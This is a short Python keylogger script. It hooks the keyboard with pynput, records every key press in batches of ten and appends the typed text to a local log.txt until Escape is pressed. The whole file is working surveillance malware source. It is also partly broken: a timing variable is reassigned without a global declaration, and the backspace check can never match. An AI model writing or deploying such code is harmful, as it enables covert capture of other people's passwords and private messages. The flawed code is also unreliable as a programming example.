import pynput
from pynput.keyboard import Key,Listener
import datetime
from datetime import datetime
count=0
keys=[]
starting_time=datetime.now()

def fprint(str):
    print(str)

def on_press(key):
    global keys,count
    if(key=="Key.backspace" and len(keys)!=0):
        keys.pop()
    else:
      keys.append(key)
    count+=1

    if count>=10:
        count=0
        write_file(keys)
        keys=[]
        limit_time=datetime.now()
        print(starting_time.minute," ",limit_time.minute," ",limit_time.minute-starting_time.minute)
        if limit_time.minute-starting_time.minute>=1 or limit_time.minute-starting_time.minute<=-40:
            starting_time=datetime.now()
            fprint("chal reah")
        

def write_file(keys):
    with open("log.txt","a") as f:
        for key in keys:
            k=str(key).replace("'","")
            print(k)
            if k == "Key.space":
                f.write(" ")
            elif k=="Key.enter":
               f.write(str("\n"))
            elif k=="Key.backspace":
                f.write(str("\b"))
            elif k.find("Key")==-1:
                 f.write(str(k))


def on_relese(key):
    if key==Key.esc:
        return False
    
with Listener(on_press=on_press,on_release=on_relese) as listener:
    listener.join()


print("Hello world")